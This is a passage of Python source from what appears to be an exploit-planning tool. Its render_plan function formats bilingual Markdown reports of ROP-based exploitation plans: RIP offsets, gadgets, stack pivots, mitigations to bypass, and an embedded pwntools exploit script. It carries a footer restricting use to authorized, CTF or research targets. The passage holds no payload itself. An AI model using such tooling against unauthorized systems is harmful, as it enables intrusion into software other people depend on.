                     "canary": r.meta.get("canary"), "relro": r.meta.get("relro")}
    except Exception:
        pass
    try:
        from .chainanalyzer import analyze_chains
        an = analyze_chains(binary, None, verify=verify, lang=lang)
    except Exception:
        an = None
    return plan_from_analysis(an, facts, binary_name=os.path.basename(binary), text=text,
                              cve=cve, lang=lang)


def render_plan(pl: ExploitPlan, lang: str = "es") -> str:
    es = lang == "es"
    if not pl.ok:
        return ("## Plan de explotacion\n\n" + (pl.note or ""))
    out = ["## " + ("Esquema de explotacion" if es else "Exploitation schema") +
           (f": {pl.cve}" if pl.cve else "")]
    out.append((f"- **Clase**: {pl.vuln_class}\n- **Primitiva**: {pl.primitive}" if es else
                f"- **Class**: {pl.vuln_class}\n- **Primitive**: {pl.primitive}"))
    # concrecion con el binario cargado (datos reales)
    if pl.concrete:
        c = pl.concrete
        cl = [("**Concreto (binario)**:" if es else "**Concrete (binary)**:")]
        if c.get("offset") is not None:
            cl.append(("  - offset a RIP: " if es else "  - RIP offset: ") + f"`{c['offset']}`")
        if c.get("reg_gadgets"):
            cl.append("  - gadgets: " + ", ".join(f"{k.upper()}@`{v}`" for k, v in c["reg_gadgets"].items()))
        if c.get("pivot"):
            cl.append("  - pivot RSP: `" + str(c["pivot"]) + "`")
        cl.append(("  - objetivo: " if es else "  - target: ") + f"`{c.get('target','?')}`"
                  + f" ({c.get('gadgets_total',0)} gadgets)")
        out.append("\n".join(cl))
    if pl.verified:
        out.append(("\n> **EXPLOIT VERIFICADO** por ejecucion en sandbox: cadena "
                    f"`{pl.concrete.get('chain','?')}`, "
                    + "  ".join(f"{k}={v}" for k, v in pl.proof.items() if k != "output" and v)
                    if es else
                    "\n> **VERIFIED EXPLOIT** by sandbox execution: chain "
                    f"`{pl.concrete.get('chain','?')}`, "
                    + "  ".join(f"{k}={v}" for k, v in pl.proof.items() if k != "output" and v)))
    out.append("\n### " + ("Fases" if es else "Phases"))
    for i, ph in enumerate(pl.phases, 1):
        out.append(f"{i}. **{ph.name}**: {ph.goal}\n   - " + ("como" if es else "how") + f": {ph.technique}"
                   + (f"\n   - " + ("necesita" if es else "needs") + f": {ph.needs}" if ph.needs else ""))
    if pl.mitigations:
        out.append("\n### " + ("Mitigaciones a sortear" if es else "Mitigations to bypass"))
        out += [f"- {m}" for m in pl.mitigations]
    if pl.kb_refs:
        out.append("\n" + ("Referencias del conocimiento (RAG): " if es else "Knowledge refs (RAG): ")
                   + ", ".join(pl.kb_refs))
    if pl.script:
        out.append("\n### " + ("Exploit reproducible (pwntools)" if es else "Reproducible exploit (pwntools)")
                   + "\n```python\n" + pl.script + "\n```")
    out.append("\n_" + ("Solo objetivos autorizados / CTF / research." if es else
                        "Authorized / CTF / research targets only.") + "_")
    return "\n".join(out)
